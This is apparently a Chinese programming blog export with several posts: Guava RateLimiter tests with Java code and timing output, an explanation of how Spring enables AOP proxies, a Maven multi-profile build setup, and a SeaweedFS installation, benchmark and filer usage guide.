运行案例程序设置10个线程,使得并发数为10，模拟线上的场景,任务内容如下 123456789101112131415161718192021class MyTask implements Runnable&#123; private CountDownLatch latch; private RateLimiter limiter; public MyTask(CountDownLatch latch, RateLimiter limiter) &#123; this.latch = latch; this.limiter = limiter; &#125; @Override public void run() &#123; try &#123; //使得线程同时触发 latch.await(); System.out.println(&quot;time &quot;+System.currentTimeMillis()+&quot;ms :&quot;+limiter.tryAcquire()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Bursty-TryAcquire这里设置限制每秒的流量为5，也就是说第一次请求过后，下次请求需要等200ms 1234567891011121314RateLimiter r =RateLimiter.create(5);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r)); latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 结果如下 12345678910111213141516171819202122countdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1countdown:0countdown overtime 1538487195698ms :truetime 1538487195699ms :falsetime 1538487195699ms :falsetime 1538487195699ms :falsetime 1538487195699ms :falsetime 1538487195699ms :falsetime 1538487195699ms :falsetime 1538487195698ms :falsetime 1538487195698ms :falsetime 1538487195699ms :false 如果使得线程等待401ms,那么程序会存储的令牌为2个 注意刚开始存储的时候，不是慢的，这里的存储量是慢慢增长，并且能够立马拿到 123456789101112131415161718RateLimiter r =RateLimiter.create(5);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r)); if (i==9)&#123; TimeUnit.MILLISECONDS.sleep(401); System.out.println(&quot;sleep 10 seconds over&quot;); &#125; latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 运行结果刚好允许3个运行 1234567891011121314151617181920212223countdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1sleep 10 seconds overcountdown:0countdown overtime 1538487297981ms :truetime 1538487297981ms :falsetime 1538487297981ms :falsetime 1538487297981ms :falsetime 1538487297981ms :truetime 1538487297981ms :truetime 1538487297981ms :falsetime 1538487297981ms :falsetime 1538487297981ms :falsetime 1538487297981ms :false 如果等待时间超过1秒，允许放行的流量也不会超过6个，存储的令牌+第一个令牌 1234567891011121314151617RateLimiter r =RateLimiter.create(5);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r)); if (i==9)&#123; TimeUnit.MILLISECONDS.sleep(1001); System.out.println(&quot;sleep 10 seconds over&quot;); &#125; latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 结果为 1234567891011121314151617181920212223countdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1sleep 10 seconds overcountdown:0countdown overtime 1538487514780ms :truetime 1538487514780ms :truetime 1538487514780ms :truetime 1538487514780ms :falsetime 1538487514780ms :truetime 1538487514780ms :falsetime 1538487514780ms :falsetime 1538487514780ms :falsetime 1538487514780ms :truetime 1538487514780ms :true WarmingUp-TryAcquire使用warmingUp的方式由于默认已经存储满了令牌，那么，它在第一次请求执行完之后，必须等待一定的时间才会让下一次请求开始，而这个请求放行的时间则是会超过存储所需要的时间 注意这里的不同，默认是存储满的，也就是刚开始的消费要慢很多 1234567891011121314RateLimiter r =RateLimiter.create(5,1,TimeUnit.SECONDS);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r)); latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 运行结果如下 12345678910111213141516171819202122countdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1countdown:0countdown overtime 1538487677462ms :truetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :falsetime 1538487677462ms :false Acquire运行案例所需要的task源码如下 123456789101112131415161718192021222324class MyTask implements Runnable&#123; private CountDownLatch latch; private RateLimiter limiter; private long start; public MyTask(CountDownLatch latch, RateLimiter limiter,long start) &#123; this.latch = latch; this.limiter = limiter; this.start=start; &#125; @Override public void run() &#123; try &#123; //使得线程同时触发 latch.await(); System.out.printf(&quot;result:&quot;+limiter.acquire(2)); System.out.println(&quot; time &quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Busty-AcquireAcquire会阻塞运行的结果，而且会提前消费 12345678910RateLimiter r =RateLimiter.create(1); r.acquire();System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;);r.acquire();System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;);r.acquire(3);System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;);r.acquire();System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;); 第一次会立马运行，然后因为请求了一次，下次发放令牌的时间往后迁移,获取的令牌越多，下次能够运行需要等待的时间越长 运行结果为 12345time cost:0mstime cost:1005mstime cost:2004mstime cost:5001ms 在多线程背景运行如下 1234567891011121314151617RateLimiter r =RateLimiter.create(1);long start=System.currentTimeMillis();r.acquire(3);System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r,start)); latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 结果如下 1234567891011121314151617181920212223time cost:1mscountdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1countdown:0countdown overresult:2.995732 time 3024msresult:4.995725 time 5006msresult:6.995719 time 7007msresult:8.995716 time 9006msresult:10.995698 time 11004msresult:12.995572 time 13006msresult:14.995555 time 15007msresult:16.995543 time 17005msresult:18.995516 time 19005msresult:20.995463 time 21005ms WarmingUp-acquirewarmingUp通过acquire的方式获取的令牌，同样会被按照同步的方式获取 1234567891011121314151617RateLimiter r =RateLimiter.create(1,1,TimeUnit.SECONDS);long start=System.currentTimeMillis();r.acquire(3);System.out.println(&quot;time cost:&quot;+(System.currentTimeMillis()-start)+&quot;ms”);ExecutorService service = Executors.newFixedThreadPool(10);CountDownLatch latch = new CountDownLatch(10);for (int i=0;i&lt;10;i++)&#123; service.submit(new MyTask(latch, r,start)); latch.countDown(); System.out.println(&quot;countdown:&quot; + latch.getCount());&#125;System.out.println(&quot;countdown over&quot;);service.shutdown(); 结果如下 1234567891011121314151617181920212223time cost:0mscountdown:9countdown:8countdown:7countdown:6countdown:5countdown:4countdown:3countdown:2countdown:1countdown:0countdown overresult:3.496859 time 3521msresult:5.496854 time 5506msresult:7.49685 time 7505msresult:9.496835 time 9504msresult:11.496821 time 11505msresult:13.496807 time 13502msresult:15.496793 time 15504msresult:17.496778 time 17506msresult:19.496707 time 19506msresult:21.496699 time 21506ms RateLimiter本身实现的就是一个令牌桶算法 来自： https://juejin.im/post/5bb48d7b5188255c865e31bc","categories":[{"name":"RateLimiter限流","slug":"RateLimiter限流","permalink":"https://gschaos.club/categories/RateLimiter%E9%99%90%E6%B5%81/"}],"tags":[{"name":"Guava","slug":"Guava","permalink":"https://gschaos.club/tags/Guava/"}]},{"title":"Spring是如何启用aop切面","slug":"Spring是如何启用aop切面","date":"2019-10-16T16:00:00.000Z","updated":"2020-10-25T08:27:49.000Z","comments":true,"path":"Spring是如何启用aop切面/","link":"","permalink":"https://gschaos.club/Spring%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E7%94%A8aop%E5%88%87%E9%9D%A2/","excerpt":"Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？","text":"Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？ Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？首先从后面说实现原理，通过aop包下的AspectJAwareAdvisorAutoProxyCreator 继承自AbstractAdvisorAutoProxyCreator 又继承 AbstractAutoProxyCreator\\类，而*AbstractAutoProxyCreator*中有个方法 12345678910111213/*** Create an AOP proxy for the given bean.* @param beanClass the class of the bean* @param beanName the name of the bean* @param specificInterceptors the set of interceptors that is* specific to this bean (may be empty, but not null)* @param targetSource the TargetSource for the proxy,* already pre-configured to access the bean* @return the AOP proxy for the bean* @see #buildAdvisors*/protected Object createProxy(Class&lt;?&gt; beanClass, @Nullable String beanName, @Nullable Object[] specificInterceptors, TargetSource targetSource) 创建一个类的代理，其中创建ProxyFactory类的对象，调用其getProxy(ClassLoader classLoader)方法，如下： 123456789101112/*** Create a new proxy according to the settings in this factory.* &lt;p&gt;Can be called repeatedly. Effect will vary if we&#x27;ve added* or removed interfaces. Can add and remove interceptors.* &lt;p&gt;Uses the given class loader (if necessary for proxy creation).* @param classLoader the class loader to create the proxy with* (or &#123;@code null&#125; for the low-level proxy facility&#x27;s default)* @return the proxy object*/public Object getProxy(@Nullable ClassLoader classLoader) &#123; return createAopProxy().getProxy(classLoader);&#125; 其中createAopProxy()来自其父类ProxyCreatorSupport，具体如下： 12345678910/*** Subclasses should call this to get a new AOP proxy. They should &lt;b&gt;not&lt;/b&gt;* create an AOP proxy with &#123;@code this&#125; as an argument.*/protected final synchronized AopProxy createAopProxy() &#123; if (!this.active) &#123; activate(); &#125; return getAopProxyFactory().createAopProxy(this);&#125; getAopProxyFactory()返回了AopProxyFactory的唯一实现DefaultAopProxyFactory，然后其调用createAopProxy方法，如下： 1234567891011121314151617@Overridepublic AopProxy createAopProxy(AdvisedSupport config) throws AopConfigException &#123; if (config.isOptimize() || config.isProxyTargetClass() || hasNoUserSuppliedProxyInterfaces(config)) &#123; Class&lt;?&gt; targetClass = config.getTargetClass(); if (targetClass == null) &#123; throw new AopConfigException(&quot;TargetSource cannot determine target class: &quot; + &quot;Either an interface or a target is required for proxy creation.&quot;); &#125; if (targetClass.isInterface() || Proxy.isProxyClass(targetClass)) &#123; return new JdkDynamicAopProxy(config); &#125; return new ObjenesisCglibAopProxy(config); &#125; else &#123; return new JdkDynamicAopProxy(config); &#125;&#125; 可以看到，根据目标类的条件，选择创建其Jdk动态代理或者基于Cglib的代理。查看DefaultAopProxyFactory类的说明可以看到： 123456Default AopProxyFactory implementation, creating either a CGLIB proxy or a JDK dynamic proxy.Creates a CGLIB proxy if one the following is true for a given AdvisedSupport instance:the optimize flag is setthe proxyTargetClass flag is setno proxy interfaces have been specifiedIn general, specify proxyTargetClass to enforce a CGLIB proxy, or specify one or more interfaces to use a JDK dynamic proxy. 默认的AopProxyFactory实现，创建CGLIB代理或JDK动态代理。 如果给定的AdvisedSupport实例满足以下条件之一，则创建CGLIB代理： 设置了优化标志 设置了proxyTargetClass标志 没有指定代理接口 通常，指定proxyTargetClass来强制执行CGLIB代理，或者指定一个或多个接口来使用JDK动态代理。 符合if条件逻辑。 实现过程理清楚了，那么，spring是如何启用aop功能的呢？如果是使用springboot的情况下，可以看到spring-boot-autoconfiguer包有一个配置类: 12345678910111213141516171819@Configuration@ConditionalOnClass(&#123; EnableAspectJAutoProxy.class, Aspect.class, Advice.class, AnnotatedElement.class &#125;)@ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;auto&quot;, havingValue = &quot;true&quot;, matchIfMissing = true)public class AopAutoConfiguration &#123; @Configuration @EnableAspectJAutoProxy(proxyTargetClass = false) @ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;proxy-target-class&quot;, havingValue = &quot;false&quot;, matchIfMissing = false) public static class JdkDynamicAutoProxyConfiguration &#123; &#125; @Configuration @EnableAspectJAutoProxy(proxyTargetClass = true) @ConditionalOnProperty(prefix = &quot;spring.aop&quot;, name = &quot;proxy-target-class&quot;, havingValue = &quot;true&quot;, matchIfMissing = true) public static class CglibAutoProxyConfiguration &#123; &#125;&#125; 可以看到，该配置类会读取配置文件中的spring.aop.auto属性，如果配置为true，或者没有配置，且路径下存在EnableAspectJAutoProxy.class, Aspect.class, Advice.class，AnnotatedElement.class这些类的时候，该配置类则生效（matchIfMissing = true），然后再读取spring.aop.proxy-target-class的值来确定 使用Cglib还是Jdk动态代理。然后启用注解@EnableAspectJAutoProxy，该注解如下： 1234567891011121314151617181920@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(AspectJAutoProxyRegistrar.class)public @interface EnableAspectJAutoProxy &#123; /** * Indicate whether subclass-based (CGLIB) proxies are to be created as opposed * to standard Java interface-based proxies. The default is &#123;@code false&#125;. */ boolean proxyTargetClass() default false; /** * Indicate that the proxy should be exposed by the AOP framework as a &#123;@code ThreadLocal&#125; * for retrieval via the &#123;@link org.springframework.aop.framework.AopContext&#125; class. * Off by default, i.e. no guarantees that &#123;@code AopContext&#125; access will work. * @since 4.3.1 */ boolean exposeProxy() default false;&#125; 可以看到该注解导入了AspectJAutoProxyRegistrar类（@Import(AspectJAutoProxyRegistrar.class)），而AspectJAutoProxyRegistrar类最终将*AnnotationAwareAspectJAutoProxyCreator*类注入了 spring中，它是AspectJAwareAdvisorAutoProxyCreator的子类。所以最终回到前文所述的，完成对bean的代理实现。 那么非springboot环境是如何启用的呢？通常在spring xml配置文件加入aop:aspectj-autoproxy/标签启用，而这个标签对应的解析器为：AopNamespaceHandler，它是位于spring aop包下。 123456789101112131415161718public class AopNamespaceHandler extends NamespaceHandlerSupport &#123; /** * Register the &#123;@link BeanDefinitionParser BeanDefinitionParsers&#125; for the * &#x27;&#123;@code config&#125;&#x27;, &#x27;&#123;@code spring-configured&#125;&#x27;, &#x27;&#123;@code aspectj-autoproxy&#125;&#x27; * and &#x27;&#123;@code scoped-proxy&#125;&#x27; tags. */ @Override public void init() &#123; // In 2.0 XSD as well as in 2.1 XSD. registerBeanDefinitionParser(&quot;config&quot;, new ConfigBeanDefinitionParser()); registerBeanDefinitionParser(&quot;aspectj-autoproxy&quot;, new AspectJAutoProxyBeanDefinitionParser()); registerBeanDefinitionDecorator(&quot;scoped-proxy&quot;, new ScopedProxyBeanDefinitionDecorator()); // Only in 2.0 XSD: moved to context namespace as of 2.1 registerBeanDefinitionParser(&quot;spring-configured&quot;, new SpringConfiguredBeanDefinitionParser()); &#125;&#125; 该类注册了AspectJAutoProxyBeanDefinitionParser类，而AspectJAutoProxyBeanDefinitionParser类又注册了（具体代码就不贴了）AnnotationAwareAspectJAutoProxyCreator，达到了同样的效果。","categories":[{"name":"spring","slug":"spring","permalink":"https://gschaos.club/categories/spring/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"maven多配置","slug":"maven多环境配置","date":"2019-10-14T16:00:00.000Z","updated":"2020-10-25T08:25:32.000Z","comments":true,"path":"maven多环境配置/","link":"","permalink":"https://gschaos.club/maven%E5%A4%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","excerpt":"开发的时候总会遇到不同环境需要的配置文件是不同的，maven提供的多配置文件打包所需要的plugin，配置一下即可搞定不同环境打包不同配置。","text":"开发的时候总会遇到不同环境需要的配置文件是不同的，maven提供的多配置文件打包所需要的plugin，配置一下即可搞定不同环境打包不同配置。 resources下面增加多配置的文件夹；如下： apollo下的application.yml 1234567app: id: DataProcessapollo: #apollo meta server地址 meta: http:&#x2F;&#x2F;192.168.6.205:8080&#x2F; #apollo本地缓存路径 默认: windows C:\\opt\\data\\ Linux: \\opt\\data\\, 在Apollo服务不可用时,会从本地恢复配置 cacheDir: doc local下的appliction.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#端口号server: port: 8688spring: application: name: Content-FrontSwitch #数据库 datasource: type: com.alibaba.druid.pool.DruidDataSource druid: url: jdbc:mysql://192.168.6.226:3306/Ti1CmdProcess?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=true username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver #连接池配置 initialSize: 5 max-active: 100 min-idle: 5 max-wait: 60000 timeBetweenEvictionRunsMillis: 60000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 100 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: falsemybatis-plus: mapper-locations: classpath:mapper/*.xml#服务注册eureka: instance: hostname: 192.168.6.205 prefer-ip-address: true lease-expiration-duration-in-seconds: 3 lease-renewal-interval-in-seconds: 1 client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://$&#123;eureka.instance.hostname&#125;:10010/eureka/management: endpoints: web: exposure: include: &quot;*&quot; endpoint: health: show-details: ALWAYSlogging: level: root: info com.jsc.content.frontswitch.mapper: debugsocket: ti3: port: 8889 filePath: /u02/ycc/ timeOut: 1000 #白名单 whitelist: - 192.168.16.201 - 192.168.16.134 - 192.168.99.166 - 192.168.6.17 - 127.0.0.1 - 192.168.6.99 ki: &#123;ki1: abcdefghijklmnop,ki2: 1234567890ABCDEF,ki3: 1234567890ABCDEF&#125; kiPassword: &#123;ki1-password: 1234567890123456,ki2-password: 1234567890123456,ki3-password: 1234567890123456&#125; kiKey: 0X27,0X3b,0X9e,0X52,0Xc0,0x4e,0xde,0x75,0x00,0xcb,0x4c,0x4d,0x57,0xfb,0x08,0x9e,0x27,0x3b,0x9e,0x52,0xc0,0x4e,0xde,0x75 licId: LIC0 leaId: IMS_YD_LEA #设备id equId: 630000-020601 #更新数据库时间 shedulTime: 30000 #线程池大小 maxNumPoolSize: 100 #socket等待超时时间 timer: 20000seaweedfs: host: &#x27;192.168.6.226&#x27; port: 9333 修改pom文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt; &lt;excludes&gt; &lt;exclude&gt;apollo&#x2F;*&lt;&#x2F;exclude&gt; &lt;exclude&gt;local&#x2F;*&lt;&#x2F;exclude&gt; &lt;&#x2F;excludes&gt; &lt;&#x2F;resource&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&#x2F;$&#123;profileActive&#125;&lt;&#x2F;directory&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;resources&gt; &lt;finalName&gt;Content-FrontSwitch&lt;&#x2F;finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;&#x2F;includeSystemScope&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugin&gt; &lt;&#x2F;plugins&gt; &lt;&#x2F;build&gt; &lt;!--profile --&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;apollo&lt;&#x2F;id&gt; &lt;properties&gt; &lt;profileActive&gt;apollo&lt;&#x2F;profileActive&gt; &lt;&#x2F;properties&gt; &lt;&#x2F;profile&gt; &lt;profile&gt; &lt;id&gt;local&lt;&#x2F;id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;&#x2F;activeByDefault&gt; &lt;&#x2F;activation&gt; &lt;properties&gt; &lt;profileActive&gt;local&lt;&#x2F;profileActive&gt; &lt;&#x2F;properties&gt; &lt;&#x2F;profile&gt; &lt;&#x2F;profiles&gt; 打包时选择需要的配置勾选并取消另外一个profile即可打包对应的配置文件，同样也可以增加mvnpackage -P apollo,!local 来使用需要的配置文件(jenkins打不同环境的包)","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"maven","slug":"maven","permalink":"https://gschaos.club/tags/maven/"}]},{"title":"SeaweedFS","slug":"SeaweedFS","date":"2019-10-05T16:00:00.000Z","updated":"2020-10-25T08:27:07.000Z","comments":true,"path":"SeaweedFS/","link":"","permalink":"https://gschaos.club/SeaweedFS/","excerpt":"seaweedfs是一个非常优秀的由 golang 开发的分布式存储开源项目。它是用来存储文件的系统，并且与使用的语言无关，使得文件储存在云端变得非常方便。","text":"seaweedfs是一个非常优秀的由 golang 开发的分布式存储开源项目。它是用来存储文件的系统，并且与使用的语言无关，使得文件储存在云端变得非常方便。 SeaweedFS简介SeaweedFS是基于go语言开发的高可用文件存储系统，主要特征 存储上亿的文件(最终受限制于硬盘大小) 速度快，内存占用小 上手使用比fastDFS要简单很多，自带Rest API。 SeaWeeDFS作为对象存储库来有效地处理小文件。不是管理中央主机中的所有文件元数据，中央主机只管理文件卷，它允许这些卷服务器管理文件和它们的元数据。这减轻了来自中央主机的并发压力，并将文件元数据扩展到卷服务器，允许更快的文件访问（仅一个磁盘读取操作）。 每个文件的元数据只有40字节的磁盘存储开销。 概述seaweedfs是一个非常优秀的由 golang 开发的分布式存储开源项目。它是用来存储文件的系统，并且与使用的语言无关，使得文件储存在云端变得非常方便。 在逻辑上Seaweedfs的几个概念： master 存储映射关系，文件和fid的映射关系 weed master Node 系统抽象的结点，抽象为datacenter、rack、datanode datacenter 数据中心，包含多个rack，类似一个机房 rack ：属于一个datacenter，类似机房中的一个机架 datanode ： 存储节点，存储多个volume，类似机架中的一个机器 weed volume volume ：逻辑卷，存储needle needle： 逻辑卷中的object，对应存储的文件 collection：文件集，默认所有文件都属于””文件集。如果想给某些文件单独分类，可以在申请id的时候指定相同的文件集 filer ：指向一个或多个master的file服务器，多个使用逗号隔开。 weed volume会创建一个 datanode ，可以指定所属的 datacenter rack和master ，会根据配置存储文件，默认一开始没有volume，当开始存储文件的时候才会创建一个volume，当这一个volume大小超过了volumeSizeLimitMB 就会新增一个volume，当volume个数超过了max则该datanode就不能新增数据了。那就需要在通过weed volume命令新增一个datanode。 搭建服务安装go环境 查看系统位数 getconf LONG_BIT 下载源码包 选择对应版本 123456789101112131415161718192021cd &#x2F;usr&#x2F;local# 下载wget https:&#x2F;&#x2F;golangtc.com&#x2F;static&#x2F;go&#x2F;1.9.2&#x2F;go1.9.2.linux-amd64.tar.gz# 将其传到其他两台机器# 解压tar -zxf go1.9.2.linux-amd64.tar.gz# 配置vim &#x2F;etc&#x2F;profile#加入export GOPATH&#x3D;&#x2F;opt&#x2F;goexport GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;goexport GOOS&#x3D;linuxexport GOBIN&#x3D;$GOROOT&#x2F;binexport GOTOOLS&#x3D;$GOROOT&#x2F;pkg&#x2F;tool&#x2F;export PATH&#x3D;$PATH:$GOBIN:$GOTOOLS# 使配置文件生效source &#x2F;etc&#x2F;profile# 查看go version 安装seaweedfs(1)下载 https://github.com/chrislusf/seaweedfs/releases/选择对应的版本 (2)解压 tar -zxf linux_amd64.tar.gz (3)./weed -h 查看帮助创建运行需要的目录 123/../data /../ vol/vol[1-3] /../logs (4)配置运行master(如单机删除defaultReplication) 12./weed master -mdir=/../data -port=9333 -defaultReplication=&quot;001&quot; -ip=&quot;172.16.20.71&quot; &amp;&gt;&gt; /../logs/master.log &amp; (5) 配置运行volume 具体参数查看帮助/usr/local/weed volume -h 1./weed volume -port=9331 -dir=vol/vol1/ -max=100 -mserver=&quot;192.168.6.224:9333&quot; -ip=&quot;192.168.6.224&quot; &amp;&gt;vol/vol1/vol1.log &amp; 单机基准测试(Benchmarks)1234567# prepare directoriesmkdir vol&#x2F;vol1 vol&#x2F;vol2 vol&#x2F;vol3# start 3 servers.&#x2F;weed server -dir&#x3D;.&#x2F;vol&#x2F;vol1 -master.port&#x3D;9333 -volume.port&#x3D;8083 &amp;.&#x2F;weed volume -dir&#x3D;.&#x2F;vol&#x2F;vol2 -port&#x3D;8084 &amp;.&#x2F;weed volume -dir&#x3D;.&#x2F;vol&#x2F;vol3 -port&#x3D;8085 &amp;.&#x2F;weed benchmark -master&#x3D;localhost:9333 可以使用命令查看基准测试帮助信息： 1.&#x2F;weed benchmark -h 默认情况下weed的基准测试使用100万1KB file 机器配置： 12345678910111213141516171819202122Architecture: x86_64CPU op-mode(s): 32-bit, 64-bitByte Order: Little EndianCPU(s): 8On-line CPU(s) list: 0-7Thread(s) per core: 1Core(s) per socket: 1CPU socket(s): 8NUMA node(s): 1Vendor ID: GenuineIntelCPU family: 6Model: 45Stepping: 7CPU MHz: 2400.000BogoMIPS: 4800.00Hypervisor vendor: VMwareVirtualization type: fullL1d cache: 32KL1i cache: 32KL2 cache: 256KL3 cache: 10240KNUMA node0 CPU(s): 0-7 基准测试结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Write 1 million 1KB file:Concurrency Level: 16Time taken for tests: 131.658 secondsComplete requests: 1048576Failed requests: 0Total transferred: 1106762855 bytesRequests per second: 7964.42 [#&#x2F;sec]Transfer rate: 8209.35 [Kbytes&#x2F;sec]Connection Times (ms) min avg max stdTotal: 0.4 1.9 338.9 2.8Percentage of the requests served within a certain time (ms) 50% 1.6 ms 66% 1.9 ms 75% 2.2 ms 80% 2.4 ms 90% 3.2 ms 95% 4.2 ms 98% 5.2 ms 99% 6.1 ms 100% 338.9 ms Randomly read 1 million files:Concurrency Level: 16Time taken for tests: 39.724 secondsComplete requests: 1048576Failed requests: 0Total transferred: 1106738848 bytesRequests per second: 26396.35 [#&#x2F;sec]Transfer rate: 27207.53 [Kbytes&#x2F;sec]Connection Times (ms) min avg max stdTotal: 0.1 0.5 64.5 0.7Percentage of the requests served within a certain time (ms) 50% 0.3 ms 66% 0.4 ms 75% 0.5 ms 80% 0.6 ms 90% 0.9 ms 95% 1.3 ms 98% 2.3 ms 99% 3.1 ms 100% 64.5 ms 删除测试数据: 1curl &quot;http:&#x2F;&#x2F;192.168.6.226:9333&#x2F;col&#x2F;delete?collection&#x3D;benchmark&amp;pretty&#x3D;y&quot; 启动服务的方式 方式1 weed scaffold -config=filer -output=. 然后修改里面leveldb的目录 weed server -dir=./vtmp -master.port=9333 -master.dir=./mtmp -volume.max=5 -volume.port=9991 -filer -filer.port=8888 -master.volumeSizeLimitMB=10 -whiteList -filer.dir 目录来存储元数据，默认为指定-dir的“filer”子目录 -master.volumeSizeLimitMB 默认最大30000000 （30G） -master.dir用于存储元数据的数据目录，默认为与指定的-dir相同 方式2 weed master -port=9333 -mdir=./mtmp weed volume -port=9991 -dir=./vtmp -max=100 -mserver=localhost:9333 weed scaffold -config=filer -output=. weed filer -port=8888 -master=localhost:9333 volume的备份机制 Replication默认000 不备份 defaultReplication 000 不备份， 只有一份数据 001 在相同的rackj里备份一份数据 010 在相同数据中心内不同的rack间备份一份数据 100 在不同的数据中心备份一份数据 200 在两个不同的数据中心各复制2次 110 在不同的rack备份一份数据， 在不同的数据中心备份一次 如果数据备份类型是 xyz形式 各自的意义 x 在别的数据中心备份的份数 y 不相同数据中心不同的racks备份的份数 z 在别的服务器相同的rack的备份份数 filer的使用首先，运行weed scaffold -config=filer生成filer.toml文件. 最简单的filer.toml可以是: 123[leveldb]enabled &#x3D; truedir &#x3D; &quot;.&quot; # directory to store level db files 启动filer功能 1234567# assuming you already started weed master and weed volumeweed filer# Or assuming you have nothing started yet,# this command starts master server, volume server, and filer in one shot. # It&#39;s strictly the same as starting them separatelyweed server -filer&#x3D;true 增加/删除/查看文件 12345678910111213# POST a file and read it backcurl -F &quot;filename&#x3D;@README.md&quot; &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;&quot;curl &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;README.md&quot;# POST a file with a new name and read it backcurl -F &quot;filename&#x3D;@Makefile&quot; &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;new_name&quot;curl &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;new_name&quot;# list sub folders and filesvisit &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;&quot;# if lots of files under this folder, here is a way to efficiently paginate through all of themvisit &quot;http:&#x2F;&#x2F;localhost:8888&#x2F;path&#x2F;to&#x2F;sources&#x2F;?lastFileName&#x3D;abc.txt&amp;limit&#x3D;50&quot; Filer有一个连接到Master的持久客户端，以获取所有卷的位置更新。没有网络往返来查找卷ID位置。 对于文件读取： 文件管理器从Filer Store查找元数据，可以是Cassandra / Mysql / Postgres / Redis / LevelDB / etcd。 Filer从卷服务器读取并传递给读取请求。 对于文件写入： 客户端流文件到Filer Filer将数据上传到Weed Volume Servers，并将大文件分成块。 Filer将元数据和块信息写入Filer存储区。 Filer Store复杂度 对于一个文件检索，（file_parent_directory，fileName）=&gt;元数据查找将是用于LSM树或Btree实现的O（logN），其中N是现有条目的数量，或者对于Redis是O（1）。 对于特定目录下的文件列表，列表只是对LSM树或Btree的简单扫描，或对于Redis的O（1）。 对于添加一个文件，如果不存在，将以递归方式创建父目录。然后将创建文件条目。 对于文件重命名，它只是O（1）操作，删除旧元数据并插入新元数据，而不更改卷服务器上的实际文件内容。 